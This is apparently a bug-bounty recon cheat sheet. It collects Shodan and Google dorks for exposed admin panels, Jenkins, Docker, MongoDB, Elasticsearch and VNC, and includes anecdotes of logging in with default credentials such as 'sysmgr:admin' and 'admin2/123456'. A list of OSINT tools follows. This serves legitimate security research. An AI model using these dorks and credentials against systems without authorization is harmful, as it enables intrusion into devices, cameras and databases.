+site:target.com
+inurl:admin
+intitle:login
+site:website.com
+intitle:/admin
+site:website.com
+inurl:admin
+intitle:admin
+intext:admin
+kibana content-length:217 net:cidr
+html:Dashboard Jenkins http.component:jenkins
+X-Amz-Bucket-Region
+x-jenkins 200
+X-Generator: Drupal 7
+all:mongodb server information all:metrics
+port:27017 -all:partially all:fs.files
+port:9200" all:elastic indices
+product:elastic port:9200
+title:system dashboard html:jira
+product: apache tomcat
+html:secret_key_base
+html:rack.version
+title:Citrix Gateway org:*programorg*
+authentication disabled RFB 003.008
+html:/dana-na/
+Docker Containers: port:2375
+root@ port:23 -login -password -name -Session
+Cisco IOS ADVIPSERVICESK9_LI-M
+Server: NessusWWW
+230 login successful port:21"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Bug Type: Unauthorized access to VioStor System allowing an attacker to control IOT devices and surveillance cameras.
+
+Reward: HOF and Gift Card.
+
+TIP: While dealing with wildcard scope, always search shodan. Dorks like : SSL:*.tld.com would give a great output.
+Also , if you come across new technology, never ignore it. Read the documentation and try to recreate the environment locally. This helped me as i was able to acess the dashboard using default credentials as
+sysmgr:admin.
+
+
+
+
+
+
+
+
+
+
+
+
+Try the simplest things
+
+- Shodan dork:
+
+ssl:"target[.]com" http.title:"index of / " I was redirected to the login page _ port: 8888
+
+- Username: admin2
+
+- Password: 123456
+
+Boom access to the admin panel
+
+
+
+
+
+
+
+
+
+
+
+
+
+We have covered working exploits and Shodan dorks for #2022year
+
+➡️ Confluence Exploit
+➡️ F5-BigIP
+➡️ Text4shell
+➡️ Spring4shell
+➡️ Log4Shell
+➡️ VMware vulnerabilities and many other #exploit
+
+Checkout our repositories and Follow us : https://lnkd.in/dzqfr5hU
+
+
+
+
+
+
+
+
+
+
+
+
+ssl:"target Inc" 200
+org:"target" 200
+
+1)got IP redirected to /~sicom/mgrng/index.phpa
+2) directly got access to SICOM Systems Restaurant Management Console at HackerOne
+3) you can check the direct path also /~sicom/mgrng/index.phpa
+
+
+
+
+
+
+
+
+
+
+
+Happy to secure another domain
+
+Issue: Origin IP Found
+
+I use shodan for finding origin ip issue
+
+Dork>> ssl:target.com 200
+
+
+
+
+
+
+
+
+
+
+Maltego
+Google Dorks
+Miaka
+SpiderFoot
+Spyse
+BuiltWith
+Intelligence X
+DarkSearch
+WhoXy
+Recon-ng
+theHarvester
+Shodan
+Metagoofil
+Searchcode
+SpiderFoot
+Babel X
+TinEye
+Wayback Machine
+
+
+
+
+
+
+
+
+
+
+
+ Dehashed—View leaked credentials.
+2. SecurityTrails—Extensive DNS data.
+3. DorkSearch—Really fast Google dorking.
+4. ExploitDB—Archive of various exploits.
+5. ZoomEye—Gather information about targets
+6. Pulsedive—Search for threat intelligence.
+7. GrayHatWarfare—Search public S3 buckets.
+8. PolySwarm—Scan files and URLs for threats.
+9. Fofa—Search for various threat intelligence.
+10. LeakIX—Search publicly indexed information.
+11. DNSDumpster—Search for DNS records quickly.
+12. FullHunt—Search and discovery attack surfaces.
+13. AlienVault—Extensive threat intelligence feed.
+14. ONYPHE—Collects cyber-threat intelligence data.
+15. Grep App—Search across a half million git repos.
+16. URL Scan—Free service to scan and analyse websites.
+17. Vulners—Search vulnerabilities in a large database.
+18. WayBackMachine—View content from deleted websites.
+19. Shodan—Search for devices connected to the internet.
+20. Netlas—Search and monitor internet connected assets.
+21. CRT sh—Search for certs that have been logged by CT.
+22. Wigle—Database of wireless networks, with statistics.
+23. PublicWWW—Marketing and affiliate marketing research.
+24. Binary Edge—Scans the internet for threat intelligence.
+25. GreyNoise—Search for devices connected to the internet.
+26. Hunter—Search for email addresses belonging to a website.
+27. Censys—Assessing attack surface for internet connected devices.
+28. IntelligenceX—Search Tor, I2P, data leaks, domains, and emails.
+29. Packet Storm Security—Browse latest vulnerabilities and exploits.
+30. SearchCode—Search 75 billion lines of code from 40 million projects
+
+
+
+
+
+
+
+
+
+
+
+
+https://link.medium.com/U7fDCY1W3tb
 
